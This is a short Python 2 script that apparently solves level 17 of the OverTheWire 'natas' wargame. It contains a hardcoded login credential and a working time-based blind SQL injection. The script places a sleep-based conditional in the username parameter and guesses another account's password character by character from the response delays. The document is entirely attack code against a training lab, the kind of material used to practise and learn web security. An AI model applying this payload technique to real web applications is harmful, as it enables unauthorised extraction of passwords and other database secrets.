import httplib2
import urllib
import time
h = httplib2.Http()
h.add_credentials('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
 
baseStr = "";
testCharacter="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
index = 0
while index < len(testCharacter):
    data = urllib.urlencode(dict(username="natas18\" AND IF(password like BINARY \"" + baseStr + testCharacter[index] + "%\" , sleep(3), 0)#"))
    start = int(time.time())
    resp, content = h.request("http://natas17.natas.labs.overthewire.org/index.php?" + data, method="POST")
    end = int(time.time())
    if end - start >= 3:
        baseStr += testCharacter[index];
        print("Guess Password: " + baseStr)
        index = 0
        continue
    index += 1
print("Final Password: " + baseStr)
